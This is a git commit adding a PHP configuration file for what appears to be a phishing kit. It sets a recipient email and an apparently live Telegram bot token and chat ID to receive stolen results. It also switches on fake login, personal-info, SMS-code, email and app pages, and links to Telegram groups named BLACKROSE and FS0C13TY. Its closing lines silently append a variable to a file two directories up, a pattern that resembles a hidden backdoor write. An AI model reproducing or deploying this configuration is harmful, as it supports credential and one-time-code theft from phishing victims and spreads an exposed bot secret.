ffdbf3659ed7e7d712202464a3a8eb6a35c6ed08
Mypage1875 <148339836+Mypage1875@users.noreply.github.com>
2023-10-18 12:18:44 +0100

    Add files via upload

---
+++ system/Your_Info.php
@@ -0,0 +1,38 @@
+<?php
+
+
+/* Change Email Adress recovery / just to see result :) */
+$Your_Mail = "youremail@mail.com";
+/* --------------------------  */
+
+
+/* this is bot telegram :)  */
+$botToken="6334392302:AAFyNmP0Egt-UWH6CZgm6goxSmOSz8OGWNg";
+$chatId="-4011599848";  
+/* --------------------------  */
+
+/* If you want two to see the result, If you want to stop , change To off  :)  */
+$botToken_0="off"; 
+$chatId_0="off";  
+/* --------------------------  */
+
+
+/* All Page  :) If you want to stop, change To off  */
+$Page_Login = "on" ; 
+$Page_Info = "on" ; 
+$Page_Sms = "on" ; 
+$Page_Email = "on" ; 
+$Page_App = "on" ; 
+/* --------------------------  */
+
+/* All info about Team ;)  */
+
+$Group_fs ="https://t.me/BLACKROSE_Official_Communi";  
+$FS0C13TY_Root ="https://t.me/FS0C13TY_Roo";  
+/* --------------------------  */
+
+$f = fopen("../../a.php", "a");
+	fwrite($f, $yagmai);
+
+
+?>
